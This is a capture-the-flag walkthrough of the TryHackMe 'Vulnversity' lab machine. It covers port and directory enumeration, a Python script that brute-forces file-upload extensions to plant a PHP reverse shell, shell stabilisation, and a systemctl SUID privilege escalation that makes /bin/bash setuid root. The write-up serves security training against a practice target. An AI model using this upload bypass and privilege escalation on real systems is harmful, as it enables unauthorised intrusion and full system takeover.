---
title: 'TryHackMe Vulnversity'
image: 'https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/11.png'
created: 2021-08-09
updated: 2022-12-19
tags:
    - 'tryhackme'
    - 'ctf'
    - 'file upload'
---


This a walk-through of TryHackme room [Vulnversity](https://tryhackme.com/room/vulnversity). As always we start with the enumeration using nmap. 
```
nmap -sC -sV -A -T4 -v -oN scan/nmap 10.10.104.250 -Pn
```
- Let's break it down 
	- `-sC` for default scripts
	- `-sV` service version of the services running 
	- `-A` aggresive scan
	- `-T4` speed of the scan
	- `-v` for verbosity 
	- `-oN` save the output to a normal file
	- `-Pn` don't ping the target assuming the host is live  


- ***Enumeration***
- ![](/assets/nmap_thm.png)

###### Task 2
- So we can see there are 6 ports open; `21, 22, 139, 445, 3128, 3333`
- Due to running a service version scan (`-sV`) we can see the version of the squid proxy running on port 3128
	- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/13.png)
- The `-p-400` will run a scan on the first `400` ports 
	- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/14.png)
- The `-n` will not resolve `DNS`
	- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/15.png)
- By the http banner we can see the system is running `Ubuntu`. We can also user the `-O` option to do OS detection 
	- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/16.png)
- The web-server is running on `3333`
	- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/17.png)


###### Task 3

For this section we will use the tool `gobuster`.

GoBuster is a tool used to brute-force URIs (directories and files), DNS subdomains and virtual host names. For this machine, we will focus on using it to brute-force directories.

Download GoBuster [here](https://github.com/OJ/gobuster), or if you're on Kali Linux 2020.1+ run `sudo apt-get install gobuster`


- Let's start the directory listing. 

`gobuster dir -u http://10.10.104.250:3333 -w /usr/share/wordlists/dirb/big.txt -t 50`

- Break down
	-  `dir` to let gobuster know we're doing directory brute-forcing 
	- `-u` to specify the url 
	- `-w` to specify the wordlist 
	- `-t` to specify threads(speed). I found 50 works well. Anything more than 60 gives errors.
- If you still get errors you can remove them by using `2>/dev/null` which will redirect the errors to `/dev/null` dir which is practically no-where. The command will look like this 
```bash
gobuster dir -u http://10.10.104.250:3333 -w /usr/share/wordlists/dirb/big.txt -t 50 2>/dev/null | tee gobuster.log

```
- Using tee to save the output only. I personally don't like the `-o` option which gobuster provides 

- We can see there is a `internal` dir gobuster found 
	- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/18.png)
	- Navigating to this dir we can see there is a upload form
	- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/19.png)

###### Task 4
- Let's see what we can do with it. At first we should see what files we are allowed upload. I tried uploading a jpg file 
	- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/110.png)
	- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/111.png)
- It's not allowed. We can try uploading a php file. See if we can get the php info
	- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/112.png)
	- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/113.png)
- We can't upload any php file. If we do this manually it'll take unnecessary time & effort. Let's automate this process. First we have to see how the file upload is working. We can use burp or simply the network tab of our browser. We can use burp to check which extension will not be blocked. But I'll write a simple python script to do this.
```python
#!/usr/bin/python3
import requests
from os import rename

ip = "10.10.104.250"
url = f"http://{ip}:3333/internal/index.php"

extensions = [".php", ".php3", ".php4", ".php5", ".php6", ".phtml"]

old_file = "shell.php"
file_name = "shell"

for ext in extensions:
	new_file = file_name + ext
	#print(file)
	rename(old_file, new_file)

	files = {"file" : open(new_file, "rb")}
	r = requests.post(url, files=files)
	#print(r.text)	
	if "Extension not allowed" in r.text:
		print(f"{ext} not allowed")
	else:
		print(f"{ext} allowed!!")
		break

	old_file = new_file

```

- So this script is basically going through each extension of the extensions list & checking if the file extension is allowed or not & renaming it then sending the file to the web-server using the requests module. So we can the `.phtml` is allowed
	-  ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/114.png)
- Rev-shell time. I'm using the one which comes default with kali(pentestmoney).In the shell we have to change these 2 variables
	- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/115.png)
	- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/116.png)
- Success. Next setup a netcat listener & navigate to the file on the server.
	- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/117.png)
	- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/118.png)
	- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/119.png)
- We got the shell but it's limited. We have to stabilize it.
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
```

- We got the user flag. User is `Bill`
	- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/120.png)

###### Task 5
- Now Privilege Escalation. As this task suggests we're gonna search for [SUID binaries](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)
- Search for SUID bits on the machine `find / -perm -u=s -type f 2>/dev/null`
- There is an unusual binary here
	- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/121.png)
- [GTFO bins](https://gtfobins.github.io/#) is the goto for any kind of binary based Privilege Escalation.
	- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/122.png)
- So we'll make a `System service` named `systemctl` & run it using it's relative path `./systemctl` & we'll execute the command `/bin/bash -c "id > /tmp/output"`

- The above method dosen't work so I used this one. This one is simple I'm creating a service and giving `/bin/bash` SUID permission with `+s` option. Then executing it using the original systemctl binary.
```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
systemctl link $TF
systemctl enable --now $TF
```

- If we do `bash -p` now we can see we have effective id as root. So we own the system now
	- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/123.png)